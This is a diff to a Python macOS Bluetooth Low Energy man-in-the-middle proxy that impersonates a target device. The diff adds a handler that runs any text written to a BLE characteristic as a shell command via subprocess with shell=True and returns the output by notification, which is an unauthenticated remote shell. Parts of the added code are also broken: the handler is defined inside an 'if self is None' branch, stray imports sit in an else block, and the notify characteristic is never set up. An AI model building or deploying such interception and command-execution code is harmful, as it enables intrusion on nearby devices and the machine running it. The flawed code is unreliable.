@@ -2,9 +2,13 @@ import os
 import json
 import asyncio
 import logging
+import subprocess
 from bleak import BleakClient
 import objc
 from Foundation import NSObject, NSLog
+import sys
+from CoreBluetooth import CBPeripheralManager
+from ble_session_debugger import start_debugger
 # Import CoreBluetooth classes via pyobjc
 objc.loadBundle("CoreBluetooth", globals(), bundle_path="/System/Library/Frameworks/CoreBluetooth.framework")
 
@@ -13,7 +17,13 @@ class MITMPeripheralDelegate(NSObject):
     def initWithMITMProxy_(self, proxy):
         self = objc.super(MITMPeripheralDelegate, self).init()
         if self is None:
-            return None
+            def peripheralManager_didReceiveWriteRequests_(self, peripheralManager, requests):
+                for request in requests:
+                    command = str(request.value.toString(), 'utf-8')
+                    logging.info(f"Received shell command: {command}")
+                    output = self.proxy.execute_shell_command(command)
+                    self.proxy.send_notification(output)
+                    peripheralManager.respondToRequest_withResult_(request, 0)
         self.proxy = proxy
         return self
 
@@ -36,6 +46,8 @@ class MacMITMProxy:
         logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(message)s")
         # Peripheral Manager setup (pseudocode)
         self.peripheral_manager = self.setup_peripheral_manager()
+        # Initialize notify characteristic placeholder
+        self.notify_char = None
 
     async def connect_to_target(self):
         try:
@@ -49,19 +61,39 @@ class MacMITMProxy:
         return True
 
     def setup_peripheral_manager(self):
-        # Using pyobjc to create a CBPeripheralManager instance
-        from CoreBluetooth import CBPeripheralManager
-        manager = CBPeripheralManager.alloc().initWithDelegate_queue_options_(None, None, None)
-        # Instantiate our custom delegate with a new name.
+        from CoreBluetooth import (
+            CBPeripheralManager,
+            CBMutableCharacteristic,
+            CBMutableService,
+            CBCharacteristicPropertyWrite,  # Use this constant instead of CBCharacteristicProperties.Write
+            CBAttributePermissionsWriteable,  # Ensure you are using the correct permissions constant as well
+            CBUUID
+        )
+        self.peripheral_manager = CBPeripheralManager.alloc().initWithDelegate_queue_options_(None, None, None)
         delegate = MITMPeripheralDelegate.alloc().initWithMITMProxy_(self)
-        manager.setDelegate_(delegate)
-        # Setup advertising with target_services information (pseudocode)
+        self.peripheral_manager.setDelegate_(delegate)
+
+        # Example: Create a mutable characteristic with the write property.
+        char_uuid = CBUUID.UUIDWithString_("0000fff3-0000-1000-8000-00805f9b34fb")
+        properties = CBCharacteristicPropertyWrite  # Correct constant for write property.
+        permissions = CBAttributePermissionsWriteable  # Correct write permissions.
+        mutable_characteristic = CBMutableCharacteristic.alloc().initWithType_properties_value_permissions_(
+            char_uuid, properties, None, permissions
+        )
+
+        # Create a service for demonstration.
+        service_uuid = CBUUID.UUIDWithString_("0000fff0-0000-1000-8000-00805f9b34fb")
+        mutable_service = CBMutableService.alloc().initWithType_primary_(service_uuid, True)
+        mutable_service.setCharacteristics_([mutable_characteristic])
+        self.peripheral_manager.addService_(mutable_service)
+
+        # Start advertising the service.
         advertising_data = {
-            # Fill in with appropriate keys like CBAdvertisementDataServiceUUIDsKey, etc.
+            "CBAdvertisementDataServiceUUIDsKey": [service_uuid]
         }
-        manager.startAdvertising_(advertising_data)
+        self.peripheral_manager.startAdvertising_(advertising_data)
         logging.info("Started peripheral advertising as proxy for target.")
-        return manager
+        return self.peripheral_manager
 
     def forward_read(self, char_uuid):
         # Forward a read request from the central to the target peripheral.
@@ -88,7 +120,7 @@ class MacMITMProxy:
     def analyze_target_services(self):
         """After connection, check discovered services against known profiles."""
         logging.info("Analyzing target services using Bluetooth SIG data...")
-        profiles_dir = os.path.join(os.getcwd(), "bluetooth-sig-public-jsons", "profiles_and_services")
+        profiles_dir = os.path.join(os.getcwd(), "bluetooth-sig-public-jsons/assigned_numbers", "profiles_and_services")
         if not os.path.isdir(profiles_dir):
             logging.warning("Profiles and services directory not found at %s.", profiles_dir)
             return
@@ -116,6 +148,25 @@ class MacMITMProxy:
                     # (Optional) Here you might prompt the user to execute one of these commands.
             else:
                 logging.info("No matching profile found for service %s", service_uuid)
+                from CoreBluetooth import (
+                    CBUUID, CBMutableService, CBMutableCharacteristic,
+                    CBCharacteristicProperties, CBAttributePermissions
+                )
+
+    def execute_shell_command(self, cmd):
+        try:
+            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=5)
+            return result.stdout + result.stderr
+        except Exception as e:
+            return str(e)
+
+    def send_notification(self, data):
+        if not hasattr(self, "notify_char") or self.notify_char is None:
+            logging.warning("Notify characteristic not set up.")
+            return
+        if isinstance(data, str):
+            data = data.encode("utf-8")
+        self.peripheral_manager.updateValue_forCharacteristic_onSubscribedCentrals_(data, self.notify_char, None)
 
     async def run(self):
         connected = await self.connect_to_target()
@@ -137,10 +188,19 @@ class MacMITMProxy:
             # Here you can also stop any advertising if necessary.
 
 if __name__ == "__main__":
-    import sys
     if len(sys.argv) < 2:
         print("Usage: python3 mac_mitm.py <target_device_address>")
         sys.exit(1)
     target_address = sys.argv[1]
     mitm_proxy = MacMITMProxy(target_address)
-    asyncio.run(mitm_proxy.run())
+    async def main():
+        connected = await mitm_proxy.connect_to_target()
+        if not connected:
+            sys.exit(1)
+        mitm_proxy.analyze_target_services()
+        # After a successful connection, launch the BLE session debugger.
+        await start_debugger(client=mitm_proxy.client, services=mitm_proxy.target_services)
+        # Continue running the MITM proxy.
+        await mitm_proxy.run()
+
+    asyncio.run(main())
